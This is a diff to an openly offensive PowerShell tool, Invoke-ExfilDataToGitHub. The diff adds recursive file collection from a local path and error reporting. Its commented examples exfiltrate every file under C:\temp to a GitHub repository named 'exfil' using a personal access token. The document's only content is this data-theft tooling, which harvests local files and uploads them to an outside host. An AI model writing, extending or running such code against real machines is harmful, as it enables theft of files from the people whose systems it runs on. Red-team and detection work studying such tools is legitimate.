@@ -35,6 +35,9 @@ Local file filter eg. *.* to get all files or *.pdf for all pdfs
 .PARAMETER Data
 Data to write to file
 
+.SWITCH Recurse
+Recursively get files from subdirectories of given local filepath
+
 
 
 .EXAMPLE
@@ -81,7 +84,13 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 
         [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
         [Object]
-        $Data
+        $Data,
+
+        [Parameter(Mandatory = $False, ParameterSetName="ExfilFilesFromFilePath")]
+        [switch]
+        $Recurse = $False
+
+
 
     )
 
@@ -180,8 +189,20 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
 if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
 {
 
+    # Make sure filepaths are in correct format
+    if ($GHFilePath[-1] -ne "/") { $GHFilePath += "/" }
+    if ($LocalFilePath[-1] -ne "\") { $LocalFilePath += "\" }
 
-    $files  = Get-Item ($LocalFilePath + $Filter)
+
+    # Check if files should be recursively retrieved 
+    if ($Recurse -eq $True){
+        $files  = Get-ChildItem -Recurse ($LocalFilePath + $Filter)
+    }
+    else {
+        $files = Get-ChildItem ($LocalFilePath + $Filter)
+    }
+
+
     #write-host $files
 
     ForEach ($file in $Files){
@@ -246,7 +267,7 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
         }
         Catch {
             $ErrorMessage = $_.Exception.Message;
-            #Write-Host "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
+            Write-Host "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
             #exit
         }
 
@@ -260,6 +281,6 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
 
 # Examples - keys do not work
 
-#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0==" -GHFilePath "testfolder/" -LocalfilePath "C:\temp\" -Filter "*.*"
+#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDNlN==" -GHFilePath "testfolder" -LocalfilePath "C:\temp" -Filter "*.*" -Recurse
 
-#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -data "a bit of test data"
+#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDNlN==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -Data "a bit of test data"
